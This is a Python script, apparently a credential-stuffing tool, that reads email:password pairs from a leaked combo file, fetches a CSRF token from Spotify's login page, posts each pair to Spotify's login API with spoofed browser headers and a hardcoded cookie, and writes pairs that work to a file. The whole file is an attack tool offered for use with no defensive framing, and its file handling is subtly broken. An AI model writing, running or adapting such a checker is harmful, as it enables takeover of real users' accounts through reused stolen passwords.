import requests
import datetime
t=datetime.date.today()
#f=open("workingspotify"+str(t.day)+str(t.month)+str(t.year)+".txt","w")
def cracker(email,password):
    s=requests.Session()
    s.head("https://accounts.spotify.com/en-HK/login?continue=https:%2F%2Fwww.spotify.com%2Fhk-en%2Faccount%2Foverview%2F")
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        "Host":"accounts.spotify.com",
        "Origin":"https://accounts.spotify.com",
        "Referer":"https://accounts.spotify.com/en-HK/login?continue=https:%2F%2Fwww.spotify.com%2Fhk-en%2Faccount%2Foverview%2F"
    }
    s1=s.get("https://accounts.spotify.com/en-HK/login?continue=https:%2F%2Fwww.spotify.com%2Fhk-en%2Faccount%2Foverview%2F",headers=headers)
    token=s1.headers['Set-Cookie'].split(";")[0].split("=")[1]
    payload={"remember":"true","username":email,"password":password,
             "csrf_token":token}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        "Host":"accounts.spotify.com",
        "Origin":"https://accounts.spotify.com",
        "Referer":"https://accounts.spotify.com/en-HK/login?continue=https:%2F%2Fwww.spotify.com%2Fhk-en%2Faccount%2Foverview%2F",
        "Content-Type":"application/x-www-form-urlencoded",
        "Cookie":"sp_t=c828e0ba59522a7d59227738d6803a31; optimizelyEndUserId=oeu1468659706323r0.9854187072591565; sp_last_utm=%7B%22utm_source%22%3A%22spotify%22%2C%22utm_medium%22%3A%22menu%22%2C%22utm_campaign%22%3A%22your_account%22%7D; spot=%7B%22t%22%3A1470329755%2C%22m%22%3A%22hk-en%22%2C%22p%22%3A%22open%22%7D; mp_329e66c6399f2a6f728674b8c0062881_mixpanel=%7B%22distinct_id%22%3A%20%221565694dba23de-056732dd7b44b4-e313161-144000-1565694dba326e%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; __tumi=acfa79e45c4d8c2218d7; __bon=MHwwfDE0MzE3OTI5NzV8NjAxMzUzMDQ5NTB8MXwxfDF8MQ==; optimizelySegments=%7B%22172210784%22%3A%22your_account%22%2C%22172815652%22%3A%22referral%22%2C%22172898846%22%3A%22false%22%2C%22173064250%22%3A%22gc%22%7D; optimizelyBuckets=%7B%7D; __tdev=hKu6UDkQ; __tvis=LaNx6xxN; csrf_token=AQCPzQgTdKMJohaKGPyk0XrAcmq-UJYB681IfFjy8mp868KxAXBkZjb4nDQQ-1rVM5qpYrQyLbpmrl3E; fb_continue=https%3A%2F%2Fwww.spotify.com%2Fhk-en%2Faccount%2Foverview%2F; _ga=GA1.2.799012141.1468659707;" 
    }
    s2=s.post("https://accounts.spotify.com/api/login",data=payload,headers=headers)
    if(len(s2.content)!=35):
        print("Valid Credentials")
        print(email,password)
        line=email+":"+password
        f.write(line+"\n")
    else:
        print("Invalid Credentials")
        print(email,password)
        pass
def bruter():
    #Filename which contains user:password
    f=open("spotifystrip1.txt","r")
    for line in f.readlines():
         temp=line.strip().split(":")
         email=temp[0]
         password=temp[1]
         cracker(email,password)

#Run bruter with no params
bruter()
f.close()
